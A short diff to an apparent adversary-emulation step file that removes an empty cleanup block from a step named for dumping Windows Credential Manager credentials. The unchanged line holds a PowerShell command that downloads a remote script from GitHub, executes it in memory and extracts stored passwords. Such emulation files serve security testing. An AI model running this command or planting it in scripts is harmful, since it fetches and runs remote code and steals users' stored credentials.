@@ -14,6 +14,3 @@ steps:
     - name: dump-credentials-from-windows-credential-manager-with-powershell-[windows-credentials]
       inline: "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
